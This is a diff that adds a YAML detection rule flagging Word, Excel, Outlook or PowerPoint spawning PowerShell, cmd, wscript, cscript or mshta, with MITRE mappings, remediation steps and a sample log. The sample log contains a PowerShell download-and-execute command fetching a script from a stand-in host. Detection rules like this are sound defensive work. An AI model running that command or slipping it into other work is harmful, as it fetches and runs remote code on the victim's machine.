@@ -1,0 +1,50 @@
+id: RULE-EP-002
+name: Suspicious Process Chain (Office → Script Interpreter)
+description: >
+  Detects an office application (Word/Excel/Outlook) or the shell spawning a
+  script interpreter or living-off-the-land binary - a classic pattern for
+  malicious macro or phishing-attachment execution.
+severity: high
+log_source: windows
+type: single
+condition:
+  event_type: process_create
+  raw.parent_process:
+    in:
+      - winword.exe
+      - excel.exe
+      - outlook.exe
+      - powerpnt.exe
+  raw.process_name:
+    in:
+      - powershell.exe
+      - cmd.exe
+      - wscript.exe
+      - cscript.exe
+      - mshta.exe
+mitre_technique:
+  - id: T1204.002
+    name: User Execution - Malicious File
+  - id: T1059
+    name: Command and Scripting Interpreter
+false_positives:
+  - Legitimate document macros that shell out for approved automation
+  - Mail-merge or reporting add-ins that spawn helper scripts
+remediation:
+  - Isolate the host and kill the child process tree
+  - Disable macros from the internet by default (GPO)
+  - Deploy Attack Surface Reduction (ASR) rules blocking Office child processes
+  - Retrieve and detonate the originating document in a sandbox
+sample_log:
+  timestamp: "2026-07-12T12:05:00Z"
+  source: windows
+  host: workstation-02
+  user: bob.jones
+  ip: 10.0.1.101
+  event_type: process_create
+  severity: high
+  raw:
+    EventID: 4688
+    process_name: powershell.exe
+    parent_process: winword.exe
+    commandline: "powershell.exe -c IEX(New-Object Net.WebClient).DownloadString('http://malicious.example/p.ps1')"
